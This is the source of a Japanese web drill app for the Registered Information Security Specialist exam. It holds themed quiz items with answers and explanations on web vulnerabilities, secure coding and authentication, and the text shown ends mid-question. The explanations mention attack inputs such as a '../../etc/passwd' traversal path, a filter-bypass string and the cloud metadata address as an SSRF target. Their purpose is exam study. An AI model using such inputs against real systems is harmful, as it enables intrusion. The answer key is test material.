<style>
:root{
  --paper:#F7F5EF;
  --paper-line:#DDD8CC;
  --ink:#1E2A3A;
  --ink-soft:#5A6472;
  --shu:#D93A1C;        /* 朱色 採点ペン */
  --shu-soft:#F6DED6;
  --kon:#27547D;        /* 紺 設問インク */
  --ok:#2E7D5B;
  --card:#FFFFFF;
  --radius:10px;
  --serif:"Shippori Mincho","Hiragino Mincho ProN","Yu Mincho",serif;
  --sans:"Zen Kaku Gothic New","Hiragino Kaku Gothic ProN","Yu Gothic",sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{
  font-family:var(--sans);color:var(--ink);background:var(--paper);
  background-image:repeating-linear-gradient(transparent,transparent 31px,rgba(90,100,114,.06) 31px,rgba(90,100,114,.06) 32px);
  min-height:100vh;line-height:1.7;
}
.wrap{max-width:780px;margin:0 auto;padding:20px 16px 80px}
header.site{display:flex;align-items:baseline;gap:12px;border-bottom:3px double var(--ink);padding:10px 2px 12px;margin-bottom:20px}
header.site h1{font-family:var(--serif);font-size:1.45rem;letter-spacing:.06em}
header.site h1 .shu{color:var(--shu)}
header.site .sub{font-size:.72rem;color:var(--ink-soft);letter-spacing:.12em}
.view{display:none}
.view.active{display:block;animation:fadein .25s ease}
@keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
@media (prefers-reduced-motion: reduce){*{animation:none!important;transition:none!important}}

/* ---------- ダッシュボード ---------- */
.stats-strip{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
.stat{background:var(--card);border:1px solid var(--paper-line);border-radius:var(--radius);padding:12px 10px;text-align:center}
.stat .num{font-family:var(--serif);font-size:1.7rem;font-weight:700;color:var(--kon)}
.stat .num.shu{color:var(--shu)}
.stat .lbl{font-size:.68rem;color:var(--ink-soft);letter-spacing:.08em}
.modes{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:24px}
.mode-btn{border:1.5px solid var(--ink);background:var(--card);border-radius:var(--radius);padding:14px 12px;text-align:left;cursor:pointer;font-family:var(--sans);transition:box-shadow .15s, transform .15s}
.mode-btn:hover{box-shadow:3px 3px 0 var(--ink);transform:translate(-1px,-1px)}
.mode-btn:focus-visible{outline:3px solid var(--shu);outline-offset:2px}
.mode-btn .t{font-weight:700;font-size:.95rem}
.mode-btn .d{font-size:.72rem;color:var(--ink-soft)}
.mode-btn.primary{background:var(--ink);color:#fff}
.mode-btn.primary .d{color:#C9CFD8}
h2.sec{font-family:var(--serif);font-size:1.05rem;border-left:5px solid var(--shu);padding-left:10px;margin:26px 0 12px;letter-spacing:.05em}
.theme-list{display:flex;flex-direction:column;gap:8px}
.theme-card{background:var(--card);border:1px solid var(--paper-line);border-radius:var(--radius);padding:12px 14px;cursor:pointer;display:grid;grid-template-columns:1fr auto;gap:4px 12px;align-items:center;transition:border-color .15s}
.theme-card:hover{border-color:var(--kon)}
.theme-card:focus-visible{outline:3px solid var(--shu);outline-offset:2px}
.theme-card .name{font-weight:700;font-size:.9rem}
.theme-card .meta{font-size:.7rem;color:var(--ink-soft)}
.theme-card .acc{font-family:var(--serif);font-size:1.15rem;font-weight:700;grid-row:span 2;text-align:right;min-width:64px}
.acc.good{color:var(--ok)} .acc.mid{color:var(--kon)} .acc.bad{color:var(--shu)} .acc.none{color:var(--paper-line)}
.bar{grid-column:1 / -1;height:7px;background:var(--paper);border-radius:4px;overflow:hidden;border:1px solid var(--paper-line);position:relative}
.bar .fill{height:100%;background:var(--kon);border-radius:4px;transition:width .4s ease}
.bar .fill.correct{background:var(--ok)}
.history{font-size:.78rem;color:var(--ink-soft)}
.history table{width:100%;border-collapse:collapse}
.history td,.history th{padding:6px 4px;border-bottom:1px dashed var(--paper-line);text-align:left}
.history th{font-weight:500;font-size:.7rem;letter-spacing:.08em}
.history .score{font-family:var(--serif);color:var(--ink);font-weight:700}
.danger-zone{margin-top:34px;text-align:right}
.link-btn{background:none;border:none;color:var(--ink-soft);font-size:.72rem;text-decoration:underline;cursor:pointer;font-family:var(--sans)}
.empty-note{background:var(--card);border:1px dashed var(--paper-line);border-radius:var(--radius);padding:16px;font-size:.82rem;color:var(--ink-soft);text-align:center}

/* ---------- 出題画面 ---------- */
.quiz-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;font-size:.78rem;color:var(--ink-soft)}
.quiz-head .theme-tag{background:var(--kon);color:#fff;border-radius:4px;padding:2px 10px;font-size:.72rem;letter-spacing:.05em}
.progress-dots{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:14px}
.dot{width:14px;height:14px;border-radius:50%;border:1.5px solid var(--paper-line);background:var(--card)}
.dot.now{border-color:var(--ink);background:var(--ink)}
.dot.ok{border-color:var(--shu);background:var(--shu-soft);position:relative}
.dot.ok::after{content:"";position:absolute;inset:2px;border:1.5px solid var(--shu);border-radius:50%}
.dot.ng{border-color:var(--ink-soft);background:var(--paper-line)}
.q-card{background:var(--card);border:1px solid var(--paper-line);border-radius:var(--radius);padding:20px 18px;position:relative;overflow:hidden}
.q-no{font-family:var(--serif);color:var(--kon);font-weight:700;font-size:.9rem;letter-spacing:.1em;margin-bottom:6px}
.q-text{font-size:.95rem;font-weight:500;margin-bottom:16px;white-space:pre-wrap}
.choices{display:flex;flex-direction:column;gap:8px}
.choice{display:flex;gap:10px;align-items:flex-start;border:1.5px solid var(--paper-line);border-radius:8px;padding:10px 12px;background:var(--card);cursor:pointer;font-size:.87rem;text-align:left;font-family:var(--sans);transition:border-color .12s,background .12s;width:100%}
.choice:hover:not(:disabled){border-color:var(--kon)}
.choice:focus-visible{outline:3px solid var(--shu);outline-offset:1px}
.choice .mark{font-family:var(--serif);font-weight:700;color:var(--kon);flex:none}
.choice.sel-correct{border-color:var(--shu);background:var(--shu-soft)}
.choice.sel-wrong{border-color:var(--ink-soft);background:#EEECE6;text-decoration:line-through;text-decoration-color:rgba(30,42,58,.4)}
.choice.reveal-correct{border-color:var(--shu);background:var(--shu-soft)}
.choice:disabled{cursor:default;opacity:.92}
/* 朱色の採点マーク */
.grade-mark{position:absolute;top:6px;right:10px;width:84px;height:84px;pointer-events:none}
.grade-mark svg{width:100%;height:100%}
.grade-mark path{fill:none;stroke:var(--shu);stroke-width:7;stroke-linecap:round;opacity:.85}
.grade-mark.draw path{stroke-dasharray:400;stroke-dashoffset:400;animation:draw .5s ease forwards}
@keyframes draw{to{stroke-dashoffset:0}}
.expl{margin-top:16px;border-top:1px dashed var(--paper-line);padding-top:12px;font-size:.83rem;display:none}
.expl.show{display:block;animation:fadein .3s ease}
.expl .verdict{font-family:var(--serif);font-weight:700;font-size:1rem;margin-bottom:4px}
.expl .verdict.ok{color:var(--shu)}
.expl .verdict.ng{color:var(--ink-soft)}
.expl .body{color:var(--ink)}
.expl .src{margin-top:6px;font-size:.72rem;color:var(--ink-soft)}
.quiz-actions{margin-top:16px;display:flex;justify-content:space-between;align-items:center}
.btn{border:1.5px solid var(--ink);background:var(--ink);color:#fff;border-radius:8px;padding:10px 22px;font-size:.88rem;font-weight:700;cursor:pointer;font-family:var(--sans)}
.btn:hover{background:var(--kon);border-color:var(--kon)}
.btn:focus-visible{outline:3px solid var(--shu);outline-offset:2px}
.btn.ghost{background:none;color:var(--ink-soft);border-color:var(--paper-line);font-weight:500}
.btn.ghost:hover{color:var(--ink);border-color:var(--ink);background:none}
.btn:disabled{opacity:.4;cursor:default}

/* ---------- 読解本文 ---------- */
.passage{background:var(--card);border:1px solid var(--paper-line);border-radius:var(--radius);margin-bottom:12px}
.passage summary{cursor:pointer;padding:10px 14px;font-family:var(--serif);font-weight:700;font-size:.9rem;color:var(--kon);list-style-position:inside}
.passage summary::marker{color:var(--shu)}
.passage-body{padding:4px 16px 16px;font-size:.85rem;border-top:1px dashed var(--paper-line)}
.passage-body p{margin:10px 0;text-indent:1em}
.passage-body u{text-decoration-color:var(--shu);text-decoration-thickness:2px;text-underline-offset:3px}
.p-table{width:100%;border-collapse:collapse;margin:12px 0;font-size:.78rem}
.p-table caption{caption-side:top;text-align:left;font-weight:700;font-size:.75rem;color:var(--kon);padding-bottom:4px}
.p-table th,.p-table td{border:1px solid var(--ink-soft);padding:5px 8px;text-align:left}
.p-table th{background:var(--paper);font-weight:700}
.sec-note{font-size:.75rem;color:var(--ink-soft);margin:-4px 0 10px}
.timer{background:var(--paper);border:1px solid var(--paper-line);border-radius:4px;padding:2px 8px;margin-right:8px;font-size:.7rem;font-variant-numeric:tabular-nums}
.timer.over{border-color:var(--shu);color:var(--shu);font-weight:700}
.passline{margin-top:14px}
.pl-bar{position:relative;height:12px;background:var(--paper);border:1px solid var(--paper-line);border-radius:6px;overflow:hidden}
.pl-fill{height:100%;transition:width .5s ease}
.pl-fill.pass{background:var(--ok)}
.pl-fill.fail{background:var(--shu)}
.pl-mark{position:absolute;top:-3px;bottom:-3px;left:60%;width:2px;background:var(--ink)}
.pl-note{font-size:.75rem;color:var(--ink-soft);margin-top:6px}
.code{background:#F2F1EC;border:1px solid var(--paper-line);border-left:4px solid var(--kon);border-radius:6px;padding:10px 12px;margin:12px 0;font-family:ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;font-size:.74rem;line-height:1.65;overflow-x:auto;white-space:pre}
.passage-body h4{font-family:var(--serif);font-size:.88rem;color:var(--kon);margin:16px 0 6px;padding-bottom:3px;border-bottom:1px solid var(--paper-line)}
/* ---------- 記述式 ---------- */
.w-label{display:block;font-size:.78rem;color:var(--kon);font-weight:700;margin-bottom:6px}
.w-input{width:100%;border:1.5px solid var(--paper-line);border-radius:8px;padding:10px 12px;font-family:var(--sans);font-size:.88rem;line-height:1.8;background:var(--paper);color:var(--ink);resize:vertical}
.w-input:focus{outline:2px solid var(--kon);outline-offset:1px;background:var(--card)}
.w-input[readonly]{background:#F2F1EC;color:var(--ink-soft)}
.w-meta{display:flex;justify-content:space-between;align-items:center;margin:6px 0 12px;font-size:.72rem;color:var(--ink-soft)}
.w-meta #w-count.over{color:var(--shu);font-weight:700}
.w-hint{background:var(--paper);border-left:3px solid var(--kon);border-radius:4px;padding:8px 10px;font-size:.78rem;margin-bottom:12px}
.w-reveal{width:100%}
.w-model{margin-top:16px;border-top:1px dashed var(--paper-line);padding-top:14px}
.w-sec{margin-bottom:14px}
.w-sec-t{font-family:var(--serif);font-size:.82rem;color:var(--shu);font-weight:700;margin-bottom:5px}
.w-model-a{background:var(--shu-soft);border-radius:6px;padding:10px 12px;font-size:.85rem}
.w-point{display:flex;gap:8px;align-items:flex-start;padding:7px 10px;border:1px solid var(--paper-line);border-radius:6px;margin-bottom:6px;font-size:.82rem;cursor:pointer;background:var(--card)}
.w-point input{margin-top:4px;flex:none;width:16px;height:16px;accent-color:var(--shu)}
/* ---------- 結果画面 ---------- */
.result-card{background:var(--card);border:1.5px solid var(--ink);border-radius:var(--radius);padding:28px 20px;text-align:center;position:relative}
.result-card .big{font-family:var(--serif);font-size:3rem;font-weight:700;color:var(--shu)}
.result-card .big small{font-size:1.2rem;color:var(--ink)}
.result-card .msg{font-size:.9rem;margin-top:4px}
.result-card .detail{margin-top:14px;font-size:.78rem;color:var(--ink-soft)}
.result-actions{display:flex;gap:10px;justify-content:center;margin-top:20px;flex-wrap:wrap}
.wrong-review{margin-top:22px;text-align:left}
.wrong-review h3{font-family:var(--serif);font-size:.95rem;margin-bottom:8px}
.wrong-item{background:var(--card);border:1px solid var(--paper-line);border-left:4px solid var(--shu);border-radius:8px;padding:10px 12px;font-size:.8rem;margin-bottom:8px}
.wrong-item .qq{font-weight:700;margin-bottom:2px}
.wrong-item .aa{color:var(--shu);font-weight:700}
@media(max-width:520px){
  .modes{grid-template-columns:1fr}
  .stats-strip{gap:7px}
  .stat .num{font-size:1.4rem}
  .grade-mark{width:64px;height:64px}
}
</style>
</head>
<body>
<div class="wrap">
  <header class="site">
    <h1>SC午後<span class="shu">ドリル</span></h1>
    <span class="sub">情報処理安全確保支援士 — テーマ別演習帳</span>
  </header>

  <!-- ホーム -->
  <section id="view-home" class="view active">
    <div class="stats-strip">
      <div class="stat"><div class="num" id="st-total">0</div><div class="lbl">累計解答数</div></div>
      <div class="stat"><div class="num shu" id="st-acc">—</div><div class="lbl">通算正答率</div></div>
      <div class="stat"><div class="num" id="st-days">0</div><div class="lbl">学習日数</div></div>
    </div>
    <div class="modes">
      <button class="mode-btn primary" onclick="startQuiz('random')">
        <div class="t">ランダム10問</div><div class="d">全テーマから頻出ウェイトで出題</div>
      </button>
      <button class="mode-btn" onclick="startQuiz('weak')">
        <div class="t">弱点復習</div><div class="d">誤答・低正答率の問題を優先出題</div>
      </button>
    </div>
    <h2 class="sec">テーマ別ドリル(出題頻度順)</h2>
    <div class="theme-list" id="theme-list"></div>
    <h2 class="sec">記述式演習(本試験と同じ解答形式)</h2>
    <p class="sec-note">本試験の解答は記述式です。自分で解答を書き、模範解答と採点観点で自己採点します。</p>
    <div class="theme-list" id="written-list"></div>
    <h2 class="sec">本番同等ボリューム(通し演習)</h2>
    <p class="sec-note">本試験1問と同等の長さの事例です。時間を計って解き、得点率60%を目標にしてください。</p>
    <div class="theme-list" id="full-list"></div>
    <h2 class="sec">読解演習(短めの事例)</h2>
    <p class="sec-note">短時間で回せる事例です。空欄【 】と下線部の設問に答えます。</p>
    <div class="theme-list" id="case-list"></div>
    <h2 class="sec">最近の取組</h2>
    <div class="history" id="history"></div>
    <div class="danger-zone"><button class="link-btn" onclick="resetData()">成績データをリセット</button></div>
  </section>

  <!-- 出題 -->
  <section id="view-quiz" class="view">
    <div class="quiz-head">
      <span class="theme-tag" id="q-theme"></span>
      <span><span id="timer" class="timer" style="display:none"></span><span id="q-counter"></span></span>
    </div>
    <div class="progress-dots" id="q-dots"></div>
    <details id="passage-box" class="passage" style="display:none">
      <summary id="passage-title">事例本文</summary>
      <div id="passage-body" class="passage-body"></div>
    </details>
    <div class="q-card">
      <div class="grade-mark" id="grade-mark"></div>
      <div class="q-no" id="q-no"></div>
      <div class="q-text" id="q-text"></div>
      <div class="choices" id="q-choices"></div>
      <div id="written-box" style="display:none"></div>
      <div class="expl" id="q-expl">
        <div class="verdict" id="q-verdict"></div>
        <div class="body" id="q-expl-body"></div>
        <div class="src" id="q-src"></div>
      </div>
    </div>
    <div class="quiz-actions">
      <button class="btn ghost" onclick="quitQuiz()">中断して戻る</button>
      <button class="btn" id="btn-next" onclick="nextQuestion()" disabled>次の問題へ</button>
    </div>
  </section>

  <!-- 結果 -->
  <section id="view-result" class="view">
    <div class="result-card">
      <div class="grade-mark draw" style="position:absolute;top:-6px;left:2px">
        <svg viewBox="0 0 100 100"><path d="M50 12 A38 38 0 1 1 49.9 12"/></svg>
      </div>
      <div class="big"><span id="r-score">0</span><small> / <span id="r-total">0</span></small></div>
      <div class="msg" id="r-msg"></div>
      <div class="detail" id="r-detail"></div>
      <div id="r-passline" class="passline" style="display:none"></div>
      <div class="result-actions">
        <button class="btn" onclick="retrySame()">同じ条件でもう一度</button>
        <button class="btn ghost" onclick="goHome()">ホームへ戻る</button>
      </div>
    </div>
    <div class="wrong-review" id="r-wrong"></div>
  </section>
</div>
<script>
// SC午後ドリル 問題バンク(過去問出題傾向分析に基づく10テーマ×10問)
const THEMES = [
  {id:"web",     name:"Webアプリの脆弱性と対策", weight:20, desc:"XSS・SQLi・CSRF・SSRFなど 毎回出題の最重要分野"},
  {id:"incident",name:"インシデント対応・ログ分析", weight:15, desc:"時系列調査・封じ込め・CSIRT ほぼ毎回出題"},
  {id:"code",    name:"セキュアプログラミング", weight:10, desc:"コードレビュー型設問の知識基盤"},
  {id:"auth",    name:"認証・認可", weight:10, desc:"OAuth/OIDC・FIDO・多要素認証 増加傾向"},
  {id:"cloud",   name:"クラウド・CI/CDセキュリティ", weight:8, desc:"R5秋以降の重点分野 SaaS設定・責任共有"},
  {id:"malware", name:"マルウェア対策", weight:8, desc:"ランサムウェア・標的型攻撃・EDR"},
  {id:"network", name:"ネットワークセキュリティ", weight:8, desc:"FW・LAN分離・プロキシ・無線LAN"},
  {id:"mail",    name:"メール・DNSセキュリティ", weight:7, desc:"SPF/DKIM/DMARC・DNS運用 周期的に出題"},
  {id:"crypto",  name:"暗号・PKI・TLS", weight:7, desc:"証明書運用・鍵管理・TLS設定"},
  {id:"mgmt",    name:"脆弱性管理・マネジメント", weight:7, desc:"CVSS・SBOM・リスクアセスメント R7で急増"}
];

const QUESTIONS = [
// ================= web =================
{id:"web01",theme:"web",q:"反射型XSSと格納型XSSの違いとして、最も適切なものはどれか。",
c:["反射型は攻撃文字列がリクエストに含まれて即座に応答へ反映されるが、格納型はサーバに保存された攻撃文字列が後から閲覧者に配信される",
"反射型はJavaScriptを使うが、格納型はHTMLタグのみを使う",
"反射型はCookieを窃取できないが、格納型はCookieを窃取できる",
"反射型はPOSTリクエストのみで成立し、格納型はGETリクエストのみで成立する"],
a:0,e:"反射型(Reflected)XSSは細工したURLを踏ませて攻撃文字列を応答に反映させる。格納型(Stored)XSSは掲示板投稿などでサーバ側に保存され、閲覧した全利用者が被害を受けるため影響範囲が広い。",s:"Webサイトのセキュリティ(H31春・R4春ほか)で頻出"},
{id:"web02",theme:"web",q:"XSS対策の基本として最も適切なものはどれか。",
c:["HTML出力時に「<」「>」「&」「\"」などを文字参照へエスケープする",
"入力値から「script」という文字列を削除する",
"通信をTLSで暗号化する",
"セッションIDをURLに含めない"],
a:0,e:"XSSの根本対策は出力時のエスケープ(サニタイジング)。ブラックリスト式の文字列削除は「scrscriptipt」のような回避が可能で不十分。TLSは盗聴対策でありXSSは防げない。",s:"午後の記述設問でも「出力時にエスケープ」は定番解答"},
{id:"web03",theme:"web",q:"SQLインジェクションの最も効果的な対策はどれか。",
c:["プレースホルダを用いたプリペアドステートメントでSQL文を組み立てる",
"入力欄の文字数を制限する",
"シングルクォートを入力禁止にする",
"WAFを導入し検査パターンを設定する"],
a:0,e:"プリペアドステートメント(バインド機構)ではSQL文の構造が先に確定し、入力値は常にデータとして扱われるため根本対策となる。文字制限やWAFは緩和策・保険的対策に位置づけられる。",s:"シラバス2-5 セキュアプログラミング/Web開発問題で頻出"},
{id:"web04",theme:"web",q:"CSRF(クロスサイトリクエストフォージェリ)攻撃の説明として適切なものはどれか。",
c:["ログイン済み利用者に攻撃者が用意したリクエストを送信させ、利用者の意図しない処理を実行させる",
"Webサーバの応答に偽のスクリプトを注入し、利用者のブラウザで実行させる",
"セッションIDを推測して他人になりすます",
"データベースへ不正なSQL文を送り込み情報を窃取する"],
a:0,e:"CSRFは被害者のブラウザが保持する認証状態(Cookie)を悪用し、罠サイト経由で送金・退会などの処理を強制する攻撃。対策はトークン(CSRFトークン)の照合や重要処理前の再認証。",s:"Webサイトのセキュリティ問題で周期的に出題"},
{id:"web05",theme:"web",q:"SSRF(サーバサイドリクエストフォージェリ)で攻撃者が狙う典型的な対象はどれか。",
c:["クラウド環境のメタデータサービス(169.254.169.254)など、外部から直接アクセスできない内部リソース",
"利用者のブラウザに保存されたCookie",
"DNSキャッシュサーバの設定ファイル",
"公開Webサーバの静的コンテンツ"],
a:0,e:"SSRFはURLを受け取って取得するサーバ側機能を悪用し、サーバを踏み台に内部ネットワークやクラウドのメタデータAPIへアクセスさせる。認証情報(一時クレデンシャル)の窃取につながる。対策はURLの検証や内部宛て通信の遮断。",s:"R5以降の新傾向。クラウド関連問題で登場"},
{id:"web06",theme:"web",q:"セッションIDの管理として不適切なものはどれか。",
c:["ログイン成功後もログイン前と同じセッションIDを使い続ける",
"セッションIDを推測困難な乱数で生成する",
"CookieにSecure属性とHttpOnly属性を付与する",
"一定時間操作がない場合にセッションを無効化する"],
a:0,e:"ログイン前後でセッションIDを変更しないと、攻撃者が事前に固定したIDでなりすますセッションフィクセーション攻撃が成立する。ログイン成功時にセッションIDを再発行するのが対策。",s:"セッション管理は記述式設問の定番"},
{id:"web07",theme:"web",q:"CookieのHttpOnly属性を付与する目的はどれか。",
c:["JavaScriptからのCookie読出しを禁止し、XSSによるセッションID窃取の被害を軽減する",
"HTTPS通信のときだけCookieを送信させる",
"同一サイトからのリクエストにのみCookieを付与する",
"Cookieの有効期限を短くする"],
a:0,e:"HttpOnly属性を付けるとdocument.cookieでの読出しができなくなり、XSSが成立してもセッションIDの直接窃取を防げる。HTTPS限定はSecure属性、送信元制限はSameSite属性の役割。",s:"属性3兄弟(Secure/HttpOnly/SameSite)の区別は頻出"},
{id:"web08",theme:"web",q:"ディレクトリトラバーサル攻撃の説明として適切なものはどれか。",
c:["「../」などの文字列を含むパス名を送信し、公開範囲外のファイルを不正に読み出す",
"Webサーバのディレクトリ一覧表示機能を無効化する",
"URLのクエリ文字列にSQL文を埋め込む",
"大量のリクエストでディレクトリ構造を総当たりする"],
a:0,e:"ファイル名をパラメータで受け取る処理で「../../etc/passwd」のような相対パスを与え、想定外のファイルへアクセスする攻撃。対策はパス名の正規化後の検証や、ファイル名にディレクトリ指定を含めない設計。",s:"シラバス2-5/Web診断問題で出題"},
{id:"web09",theme:"web",q:"Webアプリケーションの脆弱性診断に関する記述のうち、適切なものはどれか。",
c:["ツールによる自動診断と手動診断を組み合わせると、ロジックの欠陥など自動検出が難しい脆弱性も発見しやすくなる",
"自動診断ツールを使えば全ての脆弱性を検出できるため手動診断は不要である",
"診断は本番環境のみで行い、検証環境では行うべきでない",
"診断で脆弱性が検出されなければ、以後の診断は不要である"],
a:0,e:"認可制御の不備や業務ロジックの欠陥はツールでは検出困難で、手動診断との組合せが有効。診断は原則として検証環境や合意した時間帯で行い、リリース時や改修時に繰り返し実施する。",s:"セキュリティ診断(R2 PM1問3・R6秋問4)で出題"},
{id:"web10",theme:"web",q:"認可制御の不備(IDOR)に該当する事象はどれか。",
c:["URL中の注文番号を他人のものに書き換えると、他人の注文詳細が表示された",
"パスワードを5回間違えるとアカウントがロックされた",
"HTTPSでない接続がHTTPSへリダイレクトされた",
"退会済み利用者のログインが拒否された"],
a:0,e:"IDOR(Insecure Direct Object Reference)は、リソース識別子を書き換えるだけで他人のデータへアクセスできてしまう認可不備。画面遷移だけでなくAPI単位で、リソースの所有者とログイン利用者の一致をサーバ側で検証する必要がある。",s:"APIセキュリティ(R6春問1)の中心論点"},

// ================= code =================
{id:"code01",theme:"code",q:"プリペアドステートメントを使用してもSQLインジェクション対策にならないケースはどれか。",
c:["テーブル名やORDER BY句の列名を利用者入力から動的に組み立てている場合",
"数値型の入力値をバインドしている場合",
"文字列型の入力値をバインドしている場合",
"検索条件が複数ある場合"],
a:0,e:"プレースホルダにバインドできるのは値のみで、テーブル名・列名・ソート順などSQL文の構造部分には使えない。これらを入力から組み立てる場合は許可リストによる検証が必要。",s:"コードレビュー型設問で問われる応用論点"},
{id:"code02",theme:"code",q:"OSコマンドインジェクションの根本的な対策はどれか。",
c:["シェルを経由するコマンド呼出し関数を使わず、ライブラリ関数など代替手段で実装する",
"入力値の文字数を制限する",
"コマンドの実行結果を画面に表示しない",
"Webサーバをroot権限で実行しない"],
a:0,e:"system()等のシェル経由呼出しは「;」「|」などで別コマンドを注入されるおそれがある。シェルを介さないAPIや言語標準ライブラリで同じ処理を実装するのが根本対策。権限最小化は被害低減策。",s:"シラバス2-5。ソースコード修正の記述問題で出題"},
{id:"code03",theme:"code",q:"パスワードをデータベースに保存する方法として最も適切なものはどれか。",
c:["利用者ごとに異なるソルトを付加し、ストレッチングを行ったハッシュ値を保存する",
"共通鍵暗号で暗号化して保存する",
"MD5でハッシュ化して保存する",
"Base64でエンコードして保存する"],
a:0,e:"ソルトによりレインボーテーブル攻撃と同一パスワードの同一ハッシュ化を防ぎ、ストレッチング(反復計算)で総当たりを遅くする。bcryptやPBKDF2などが該当。可逆な暗号化やMD5、単なるエンコードは不適切。",s:"認証システムの開発(R3春問1)などで出題"},
{id:"code04",theme:"code",q:"レースコンディション(TOCTOU)脆弱性の説明として適切なものはどれか。",
c:["資源の検査と使用の間に他の処理が割り込むことで、検査結果と実際の状態が食い違い不正が成立する",
"再帰呼出しが深くなりスタックがあふれる",
"確保したメモリを解放し忘れて使用量が増え続ける",
"例外処理が漏れてスタックトレースが表示される"],
a:0,e:"Time of Check to Time of Useの略。残高チェックと引落しの間に並行リクエストを差し込まれ二重引出しされる例が典型。排他制御やトランザクションでの一貫性確保が対策。",s:"決済サービス問題(R4春問3など)で問われる論点"},
{id:"code05",theme:"code",q:"エラーメッセージの取扱いとして適切なものはどれか。",
c:["利用者には汎用的なメッセージのみ表示し、スタックトレース等の詳細はサーバ側ログに記録する",
"デバッグを容易にするため、例外の詳細を画面に表示する",
"エラー発生時はログを残さず処理を継続する",
"SQLエラーの内容をそのまま利用者に返す"],
a:0,e:"詳細なエラー情報(SQL文、パス、バージョン等)は攻撃者に内部構造を教えてしまう。画面には汎用メッセージ、詳細は保護されたログへ、が原則。",s:"Web開発問題の定番小問"},
{id:"code06",theme:"code",q:"ソースコードの静的解析(SAST)の特徴として適切なものはどれか。",
c:["プログラムを実行せずにコードを解析し、開発の早い段階で脆弱性の候補を検出できる",
"実行中のアプリケーションに擬似攻撃を行い脆弱性を検出する",
"誤検知(偽陽性)が発生しない",
"本番環境でのみ実施できる"],
a:0,e:"SASTは実行せずに解析するため開発早期(コミット時・CI)に組み込める。一方で偽陽性が多く出る傾向があり、結果の精査が必要。実行しながらの診断はDAST。",s:"シラバス2-6 セキュリティテスト/CI問題(R5秋問3)関連"},
{id:"code07",theme:"code",q:"ファイルアップロード機能の実装として不適切なものはどれか。",
c:["アップロードされたファイルを公開ディレクトリに元のファイル名のまま保存し、直接URLでアクセスさせる",
"拡張子とContent-Typeに加えファイル内容の形式を検証する",
"保存時にサーバ側で生成したランダムなファイル名を付与する",
"保存先を公開ディレクトリ外とし、プログラム経由で配信する"],
a:0,e:"元のファイル名のまま公開ディレクトリに置くと、.phpなどのスクリプトを置かれて実行される(Webシェル設置)おそれがある。保存先の分離・ファイル名の付替え・内容検証が定石。",s:"Webアプリ開発問題で繰り返し出題"},
{id:"code08",theme:"code",q:"CORSの設定として最も危険なものはどれか。",
c:["Access-Control-Allow-Originにリクエスト中のOrigin値をそのまま返し、かつ資格情報付きリクエストを許可する",
"Access-Control-Allow-Originを自社の特定ドメインに限定する",
"プリフライトリクエストに応答する",
"許可するHTTPメソッドをGETとPOSTに限定する"],
a:0,e:"Originをオウム返しにして credentials も許可すると、任意のサイトから認証付きでAPIを呼ばれ、応答内容を読み取られる。許可するオリジンは明示的な許可リストで管理する。",s:"APIセキュリティ(R6春問1)関連論点"},
{id:"code09",theme:"code",q:"XMLの外部実体参照(XXE)攻撃への対策として適切なものはどれか。",
c:["XMLパーサの設定で外部実体参照(DTD処理)を無効化する",
"XML宣言のencodingをUTF-8に固定する",
"XMLをgzip圧縮して受信する",
"XMLの要素数を制限する"],
a:0,e:"XXEは外部実体参照を悪用してサーバ内のファイル読出しやSSRFを行う攻撃。パーサで外部実体・DTDの解決を無効にするのが根本対策。",s:"シラバス2-5関連。API・Webサービス問題で登場"},
{id:"code10",theme:"code",q:"オープンリダイレクトの脆弱性がもたらす主なリスクはどれか。",
c:["正規サイトのURLを装ってフィッシングサイトへ誘導される",
"サーバのファイルが改ざんされる",
"データベースの内容が削除される",
"通信内容が盗聴される"],
a:0,e:"リダイレクト先URLをパラメータで受け取る実装で検証がないと、正規ドメインで始まるリンクから悪性サイトへ転送でき、フィッシングの信憑性を高めてしまう。転送先は許可リストで検証する。",s:"ログイン後リダイレクト機能の設問で出題"},

// ================= auth =================
{id:"auth01",theme:"auth",q:"多要素認証の組合せとして正しいものはどれか。",
c:["パスワード(知識)とスマートフォンの認証アプリ(所持)",
"パスワードと秘密の質問",
"指紋と顔認証",
"パスワードとPINコード"],
a:0,e:"多要素認証は知識・所持・生体という異なる要素の組合せが条件。パスワード+秘密の質問は知識×2、指紋+顔は生体×2でいずれも多要素とはいえない。",s:"認証問題の基本。本文条件の読解にも必須"},
{id:"auth02",theme:"auth",q:"FIDO2/WebAuthnによる認証がフィッシングに強い理由はどれか。",
c:["認証器が署名対象にオリジン(サイトのドメイン)を含めるため、偽サイトで取得した応答を正規サイトに使い回せない",
"パスワードを毎回変更するため",
"通信を必ずVPN経由にするため",
"生体情報をサーバに登録して照合するため"],
a:0,e:"WebAuthnでは公開鍵暗号のチャレンジレスポンスに接続先オリジンが束縛されるため、偽サイトで認証しても正規サイトでは検証に失敗する。生体情報は端末内で照合されサーバへは送られない。",s:"認証システムの開発(R3春問1)ほかで出題"},
{id:"auth03",theme:"auth",q:"OAuth 2.0の認可コードフローで、認可コード横取り攻撃への対策として用いられるものはどれか。",
c:["PKCE(code_verifier/code_challenge)",
"ステートレスなアクセストークン",
"リフレッシュトークンの長期化",
"インプリシットフローへの変更"],
a:0,e:"PKCEはクライアントが生成した検証値をトークン要求時に照合させ、認可コードを横取りしてもトークンを取得できなくする仕組み。スマホアプリ等のパブリッククライアントで必須とされる。",s:"スマホアプリ開発(R7春問3)・API問題の重要論点"},
{id:"auth04",theme:"auth",q:"OAuth 2.0のstateパラメータの目的はどれか。",
c:["認可要求と応答を紐付けて検証し、CSRFによる不正な認可応答の受入れを防ぐ",
"アクセストークンの有効期限を指定する",
"ユーザーの権限スコープを指定する",
"リダイレクトURIを暗号化する"],
a:0,e:"stateは推測困難な値をセッションと紐付けて往復させ、攻撃者が用意した認可応答を被害者のセッションに注入するCSRF攻撃を防ぐ。スコープ指定はscopeパラメータの役割。",s:"OAuth/OIDCの設問で頻出"},
{id:"auth05",theme:"auth",q:"OpenID Connect(OIDC)がOAuth 2.0に追加した主要な要素はどれか。",
c:["利用者の認証結果を表すIDトークン(署名付きJWT)",
"アクセストークン",
"リフレッシュトークン",
"クライアントシークレット"],
